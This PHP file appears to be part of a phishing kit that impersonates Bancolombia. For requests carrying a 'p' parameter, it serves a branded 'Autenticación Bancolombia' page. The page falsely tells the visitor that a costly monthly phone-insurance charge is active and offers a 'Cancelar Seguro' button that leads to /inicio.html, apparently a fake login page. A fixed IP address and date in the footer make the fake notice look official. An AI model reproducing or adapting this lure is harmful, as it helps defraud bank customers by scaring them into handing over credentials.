<?php
// Si NO hay parámetro, mostrar inicio.html por defecto
if (!isset($_REQUEST["p"])) {
    include(__DIR__ . '/../inicio.html');  // Ruta absoluta desde el directorio actual
    exit;
}

// Si SÍ hay parámetro, mostrar página del seguro
$key = $_REQUEST["p"];
$jsCode = <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link href="/assets/css/main.css" rel='stylesheet'>
    <link rel="icon" href="/assets/img/logo.png">
    <title>Autenticación Bancolombia</title>
</head>
<body>
    <div class="img" style="text-align: center; padding: 5%;">
        <img src="/assets/img/Bancolombia..svg" alt="" srcset="" width="40%">
    </div>
    <div style="margin-top: 70px;">
        <img src="/assets/img/cel.png" alt="" srcset="" width="100%">
    </div>
    <div class="texto" style="text-align: center; margin-top: 30px;">
        <h3>Seguro Celular Protegido</h3>
        <a>Seguridad en cada situación. Protege tu celular ante robos, daños a la pantalla y accidentes</a><br>
        <br><h4>$137.900 Primer mes, después $210.330/Mes</h4><br>
        <form action="/inicio.html" method="post">
            <button class="box__btn" style="width: 70%; margin-top: 10px; color: black;">Cancelar Seguro</button>
        </form>
    </div>
    <footer class="footer" style="margin-top: 50px;">
        <div class="line"></div>
        <div class="footer__logo1"></div>
        <div class="footer__logo2"></div>
        <span>
            <p>Dirección IP: 190.210.118.1</p>
            <p id="currentDate">Jueves, 27 de Junio de 2024, 2:57 p. m.</p>
        </span>
    </footer>
</body>
</html>
<script src="/assets/js/main.js"></script>
HTML;

echo $jsCode;
?>